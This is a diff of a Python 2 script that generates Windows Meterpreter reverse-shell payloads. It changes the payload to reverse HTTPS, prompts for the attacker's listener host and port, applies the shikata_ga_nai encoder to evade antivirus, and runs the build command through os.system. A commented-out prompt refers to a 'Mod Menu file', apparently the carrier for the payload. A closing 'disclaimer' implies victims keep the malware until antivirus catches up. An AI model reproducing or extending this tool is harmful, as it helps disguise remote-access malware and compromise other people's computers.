@@ -11,9 +11,9 @@ import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
-payload_Generate = 'windows/meterpreter/reverse_tcp'
-LHOST = '8.8.8.8'
-LPORT = '443'
+payload_Generate = 'windows/meterpreter_reverse_https'
+LHOST = str(raw_input("Enter LHOST (or 8.8.8.8 if you don't care): "))
+LPORT = str(raw_input("Enter LPORT (usually 443 is good enough): "))
 # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 bad_Bytes = 'x00'
 payload_Encoder = 'x86/shikata_ga_nai'
@@ -54,7 +54,7 @@ while True:
         )
         print 'Now running command: ' + cmd_String
         os.system(cmd_String)
-        
+
         print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
 
     else:
